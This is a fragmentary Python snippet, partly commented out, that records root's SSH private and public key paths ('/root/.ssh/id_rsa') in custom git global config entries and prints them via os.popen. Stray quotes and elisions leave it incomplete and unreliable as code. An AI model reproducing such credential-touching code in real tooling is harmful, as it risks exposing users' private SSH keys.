...
#     baseOS("shh.key","/root/.ssh/id_rsa")
#     baseOS("shh.pub","/root/.ssh/id_rsa.pub")
#     print("[shh.key] : ",os.popen("git config --global shh.key").read())
#     print("[shh.pub] : ",os.popen("git config --global shh.pub").read())
# else:
#     print("[shh.key] : ",os.popen("git config --global shh.key").read())
#     print("[shh.pub] : ",os.popen("git config --global shh.pub").read())
...
# -*- coding: UTF-8 -*-
import os
print(os.popen("git config --global shh.key").read())
                    '''
...
if len(os.popen("git config --global git.key").read()):
    ...
    print(os.popen("git config --global shh.pub").read())
                    '''
